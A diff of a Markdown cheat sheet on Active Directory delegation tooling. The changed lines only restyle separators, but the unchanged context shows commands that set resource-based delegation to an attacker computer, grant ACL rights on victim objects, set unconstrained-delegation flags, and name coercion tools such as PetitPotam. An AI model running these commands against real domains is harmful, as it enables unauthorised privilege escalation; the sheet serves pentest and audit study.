@@ -19,7 +19,7 @@ linked:
 ---
 # AD - Delegation Enumeration - Tooling
 
-***
+---
 
 ## netexec / crackmapexec
 
@@ -31,7 +31,7 @@ linked:
 | `nxc ldap <DC> -u u -p p --query "(msDS-KeyCredentialLink=*)" "samAccountName"` | Shadow Cred set | Audit. |
 ^ad-deleg-tool-netexec
 
-___
+---
 
 ## RSAT / PowerShell
 
@@ -46,7 +46,7 @@ ___
 | `Set-ADComputer <target> -PrincipalsAllowedToDelegateToAccount <attacker-computer>` | Set RBCD (priv) | Privesc setup. |
 ^ad-deleg-tool-rsat
 
-___
+---
 
 ## PowerView (Adversary)
 
@@ -61,7 +61,7 @@ ___
 | `Add-DomainObjectAcl -TargetIdentity <victim> -PrincipalIdentity <atacante> -Rights All` | Add ACE for delegation setup | Privesc. |
 ^ad-deleg-tool-powerview
 
-___
+---
 
 ## BloodHound / SharpHound
 
@@ -76,7 +76,7 @@ ___
 | `MATCH p=shortestPath((u {owned:true})-[*1..]->(t {highvalue:true})) WHERE any(r IN relationships(p) WHERE type(r) IN ["AllowedToDelegate","AllowedToAct","AddKeyCredentialLink"]) RETURN p` | Privesc paths via delegation | Path planning. |
 ^ad-deleg-tool-bh
 
-___
+---
 
 ## ldapsearch / Linux
 
@@ -88,7 +88,7 @@ ___
 | `ldapsearch ... "(msDS-KeyCredentialLink=*)" samAccountName` | Shadow Cred raw | Linux. |
 ^ad-deleg-tool-ldapsearch
 
-___
+---
 
 ## Delegation Attack Tools
 
@@ -108,7 +108,7 @@ ___
 | `PetitPotam.py / Coercer.py / dfscoerce.py` | Auth coercion para UD chain | Coercion. |
 ^ad-deleg-tool-attack
 
-___
+---
 
 ## bloodyAD
 
@@ -121,7 +121,7 @@ ___
 | `bloodyAD --host <DC> -d corp -u u -p pass set uac <user> -f TRUSTED_FOR_DELEGATION` | Set UD flag (priv) | Privesc setup. |
 ^ad-deleg-tool-bloodyad
 
-___
+---
 
 ## Recursos
 
@@ -139,4 +139,4 @@ ___
 | The Hacker Recipes — Delegations | `https://www.thehacker.recipes/ad/movement/kerberos/delegations` |
 ^ad-deleg-tool-resources
 
-***
+---
